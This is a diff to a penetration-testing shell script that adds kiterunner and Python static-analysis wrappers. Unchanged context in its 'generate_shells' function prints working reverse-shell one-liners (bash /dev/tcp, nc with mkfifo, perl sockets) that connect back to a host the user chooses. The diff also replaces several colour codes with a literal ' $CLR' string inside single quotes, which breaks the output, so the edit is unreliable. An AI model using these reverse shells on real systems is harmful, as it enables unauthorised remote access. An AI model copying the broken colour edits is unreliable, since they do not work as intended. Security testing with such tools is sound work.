@@ -8,7 +8,7 @@
 HACKING_HOME="/Users/bl4de/hacking"
 
 GRAY='\033[1;30m'
-RED='\033[1;31m'
+RED=' $CLR'
 GREEN='\033[1;32m'
 LIGHTGREEN='\033[32m'
 YELLOW='\033[1;33m'
@@ -296,6 +296,32 @@ ransack() {
     echo -e "\n$BLUE[+] Done.$CLR"
 }
 
+kiterunner() {
+    HOSTNAME=$1
+    echo -e "$BLUE[+] Running kiterunner using apis file...$CLR\n"
+
+    kr scan apis -w $DICT_HOME/routes-large.kite -x 20 -j 100 --fail-status-codes 400,401,404,403,501,502,426,411
+    echo -e "\n$BLUE[+] Done.$CLR"
+}
+
+# Python Static Source Code analysis
+pysast() {
+    FILE_NAME=$1
+    echo -e "$BLUE[+] Running pyflakes against $FILE_NAME $CLR\n"
+    python3 -m pyflakes $FILE_NAME
+
+    echo -e "$BLUE[+] Running mypy against $FILE_NAME $CLR\n"
+    python3 -m mypy $FILE_NAME
+
+    echo -e "\n$BLUE[+] Running bandit against $FILE_NAME $CLR\n"
+    python3 -m bandit -r $FILE_NAME
+
+    echo -e "\n$BLUE[+] Running vulture against $FILE_NAME $CLR\n"
+    python3 -m vulture $FILE_NAME
+
+    echo -e "\n$BLUE[+] Done.$CLR"
+}
+
 # checking AWS S3 bucket
 s3() {
     echo -e "$BLUE[+] Checking AWS S3 $1 bucket$CLR"
@@ -441,10 +467,10 @@ generate_shells() {
 
     echo -e "$BLUE[+] OK, here are your shellz...\n$CLR"
 
-    echo -e "\033[1;31m[bash]\033[0m bash -i >& /dev/tcp/$1/$port 0>&1"
-    echo -e "\033[1;31m[bash]\033[0m 0<&196;exec 196<>/dev/tcp/$1/$port; sh <&196 >&196 2>&196"
-    echo -e "\033[1;31m[bash]\033[0m rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $1 $port >/tmp/f"
-    echo -e "\033[1;31m[bash]\033[0m rm -f backpipe; mknod /tmp/backpipe p && nc $ip $port 0<backpipe | /bin/bash 1>backpipe"
+    echo -e " $CLR[bash]\033[0m bash -i >& /dev/tcp/$1/$port 0>&1"
+    echo -e " $CLR[bash]\033[0m 0<&196;exec 196<>/dev/tcp/$1/$port; sh <&196 >&196 2>&196"
+    echo -e " $CLR[bash]\033[0m rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $1 $port >/tmp/f"
+    echo -e " $CLR[bash]\033[0m rm -f backpipe; mknod /tmp/backpipe p && nc $ip $port 0<backpipe | /bin/bash 1>backpipe"
     echo -e "$NEWLINE"
     echo -e "\033[1;34m[perl]\033[0m perl -e 'use Socket;\$i=\"$1\";\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
     echo -e "\033[1;34m[perl]\033[0m perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$1:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
@@ -491,6 +517,12 @@ case "$cmd" in
     ;;
     ransack)
         ransack "$2"
+    ;;
+    kiterunner)
+        kiterunner "$2"
+    ;;
+    pysast)
+        pysast "$2"
     ;;
     full_nmap_scan)
         full_nmap_scan "$2" "$3"
@@ -568,7 +600,8 @@ case "$cmd" in
         echo -e "Usage:\t$YELLOW s0mbra.sh {cmd} {arg1} {arg2}...{argN}\n"
         echo -e "$BLUE:: RECON ::$CLR"
         echo -e "\t$CYAN recon $GRAY[DOMAIN]$CLR\t\t\t\t\t -> basic recon: subfinder + nmap + httpx + ffuf + nuclei (one tool at the time on all hosts)"
-        echo -e "\t$CYAN ransack $GRAY[HOST]$CLR\t\t\t\t\t -> bruteforce recon on host: nmap (top 1000 ports) + ffuf + nuclei"
+        echo -e "\t$CYAN ransack $GRAY[HOST]$CLR\t\t\t\t\t -> bruteforce recon on host: nmap (top 1000 ports) + nikto + ffuf + nuclei"
+        echo -e "\t$CYAN kiterunner $GRAY[HOST] (*apis)$CLR\t\t\t -> runs kiterunner against apis file on [HOST] (create apis file first ;) )"
         echo -e "\t$CYAN htpx $GRAY[DOMAINS_LIST] [OUTPUT_FILE] $CLR\t\t -> httpx against DOMAINS_LIST, matching 200, 403 and 500 + stack, web server discovery"
         echo -e "\t$CYAN quick_nmap_scan $GRAY[IP] [*PORTS]$CLR\t\t\t -> nmap --top-ports [PORTS] to quickly enumerate open N-ports"
         echo -e "\t$CYAN full_nmap_scan $GRAY[IP] [*PORTS]$CLR\t\t\t -> nmap --top-ports [PORTS] to enumerate ports; -p- if no [PORTS] given; then -sV -sC -A on found open ports"
@@ -593,6 +626,7 @@ case "$cmd" in
         echo -e "\t$CYAN npm_scan $GRAY[MODULE_NAME]\t\t$YELLOW(JavaScript)$CLR\t -> static code analysis of MODULE_NAME npm module with nodestructor"
         echo -e "\t$CYAN javascript_sca $GRAY[FILE_NAME]\t$YELLOW(JavaScript)$CLR\t -> static code analysis of single JavaScript file with nodestructor"
         echo -e "\t$CYAN decompile_jar $GRAY[.jar FILE]\t$YELLOW(Java)$CLR\t\t -> open FILE.jar file in JD-Gui"
+        echo -e "\t$CYAN pysast $GRAY[.py FILE]\t\t$YELLOW(Python)$CLR\t -> Static Code Analysis of Python file with pyflakes, mypy, bandit and vulture"
         echo -e "$BLUE:: ANDROID ::$CLR"
         echo -e "\t$CYAN jadx $GRAY[.apk FILE]\t\t$YELLOW(Java)$CLR\t\t -> open FILE.apk file in JADX GUI"
         echo -e "\t$CYAN dex_to_jar $GRAY[.dex file]$CLR\t\t\t\t -> exports .dex file into .jar"
